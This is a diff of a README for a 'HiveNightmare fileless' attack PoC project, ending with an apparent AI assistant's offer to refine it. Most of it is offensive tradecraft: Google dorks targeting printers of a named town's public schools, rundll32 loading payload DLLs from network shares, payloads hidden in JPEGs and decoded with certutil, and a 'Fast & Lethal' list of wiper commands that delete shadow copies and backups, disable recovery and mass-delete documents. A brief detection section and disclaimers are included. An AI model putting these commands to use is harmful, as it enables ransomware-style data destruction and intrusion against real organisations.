@@ -1,6 +1,6 @@
 
 
-# HiveNightmare 'Fileless' Exploit PoC:
+# HiveNightmare 'Fileless' Exploit PoC
 
 - [Overview](#overview)
 - [Features](#features)
@@ -21,11 +21,11 @@
 
 ## Overview
 
-**CVE-2021-36934/HiveNightmare** is an educational red/purple team research project that simulates a **fileless malware** attack framework on **Windows 11**. It enables the emulation of real-world adversary kill chains using [MITRE ATT&CK](https://attack.mitre.org/) techniques, with a focus on stealthy, fileless operations.
+**CVE-2021-36934/HiveNightmare** is an educational red/purple team research project that simulates a **fileless malware** attack framework on **Windows 11**. It enables the emulation of real-world attack chains using built-in Windows binaries (LOLBins).
 
 > **Warning:** For research and training in isolated labs only. **Do not use on production or unauthorized systems.**
 
-## LOLBINS 'Fileless' malware basic example:
+## LOLBINS 'Fileless' Malware Basic Example
 
 The following PowerShell simulation demonstrates a typical fileless ransomware attack chain using built-in Windows tools (LOLBins):
 
@@ -68,7 +68,6 @@ Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ra
 **Example Objective:** Identify publicly exposed printer services in Moberly, Missouri, potentially vulnerable to exploits like PrintNightmare.
 
 **Sample Google Dork Queries:**
-
 ```
 inurl:"/hp/device/this.LCDispatcher" "Moberly"
 intitle:"Printer Status" "Moberly Public Schools"
@@ -91,11 +90,9 @@ intitle:"EpsonNet Config" "Moberly"
 **Living Off the Land Binaries (LOLBins)** are legitimate, trusted Windows binaries commonly abused by adversaries to bypass security controls and run malicious code filelessly.
 
 **Example Use (Print Service Attack):**
-
 ```cmd
 rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
 ```
-
 > Attackers use LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` to execute payloads from network shares, often after identifying exposed printers or servers via reconnaissance.
 
 ---
@@ -105,12 +102,10 @@ rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
 **Goal:** Deliver payloads covertly by embedding archives within images and extracting them using native tools.
 
 **Steps:**
-
 1. **Embed Payload:**
    ```bash
    copy /b nsfw.jpg + payload.7z nsfw.jpg
    ```
-
 2. **Extract & Decode:**
    ```cmd
    certutil -decode nsfw.jpg dropper.7z
@@ -129,7 +124,6 @@ rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
 ```cmd
 rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
 ```
-
 > This enables stealthy, in-memory execution without leaving artifacts on disk.
 
 ---
@@ -151,64 +145,56 @@ rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
 ### ⚔️ LOLBin Data Destruction – Fast & Lethal
 
 #### 1. `cipher.exe` – Wipe Free Space
-
 ```cmd
 cipher /w:C:\
 ```
 
 #### 2. `vssadmin.exe` – Delete Shadow Copies
-
 ```cmd
 vssadmin delete shadows /all /quiet
 ```
 
 #### 3. `wbadmin.exe` – Nuke Backups
-
 ```cmd
 wbadmin delete systemstatebackup -keepVersions:0
 ```
 
 #### 4. `bcdedit.exe` – Disable Recovery
-
 ```cmd
 bcdedit /set {default} recoveryenabled No
 ```
 
 #### 5. `fsutil.exe` – Force Dirty Volume
-
 ```cmd
 fsutil dirty set C:
 ```
 
 #### 6. `wmic.exe` – Delete Files via WMI
-
 ```cmd
 wmic process call create "cmd.exe /c del /f /s /q C:\Users\*.docx"
 ```
 
 #### 7. `forfiles.exe` – Timed Wipe
-
 ```cmd
 forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file"
 ```
 
 #### 8. `schtasks.exe` – Scheduled Kill
-
 ```cmd
 schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59
 ```
 
 #### 9. `reg.exe` – Registry Destruction
-
 ```cmd
 reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f
 ```
 
 #### 10. `certutil.exe` – Decode + Detonate
-
 ```cmd
 certutil -decode payload.b64 wipe.exe && wipe.exe
 ```
+
+---
 
 ## Detection & Mitigation
 
@@ -218,7 +204,6 @@ certutil -decode payload.b64 wipe.exe && wipe.exe
   - Monitor `rundll32.exe` loading non-system DLLs
   - Watch for abnormal use of `certutil.exe`, `regsvr32.exe`, `mshta.exe`
   - Track shadow volume access by non-admins
-
 - **SIEM Examples (ELK/Splunk):**
   - Alerts on execution from public shares
   - Parent/child process anomalies (e.g., `explorer.exe` spawning `rundll32.exe`)
@@ -239,7 +224,7 @@ certutil -decode payload.b64 wipe.exe && wipe.exe
 
 ## Legal Disclaimer
 
-> **All content, code, and techniques in this repository are for educational and authorized penetration testing only. Do not use any part of this project outside of controlled, isolated environments and without explicit permission. The authors assume no liability for misuse.**
+> **All content, code, and techniques in this repository are for educational and authorized penetration testing only. Do not use any part of this project outside of controlled, isolated environments and with explicit permission. The author is not responsible for any misuse or damages.**
 
 ---
 
@@ -253,9 +238,13 @@ certutil -decode payload.b64 wipe.exe && wipe.exe
 - [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
 - [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
 - [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)
-- [Mitre Attck T1055](https://attack.mitre.org/techniques/T1055/001/)
+- [Mitre ATT&CK T1055](https://attack.mitre.org/techniques/T1055/001/)
 - [Hivenightmare demo](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)
 
 ---
 
 **Stay safe, research responsibly, and always use in a legal and ethical manner.**
+
+---
+
+If you need this as a file or want specific improvements (like adding a "Features" section or more code comments), please specify!
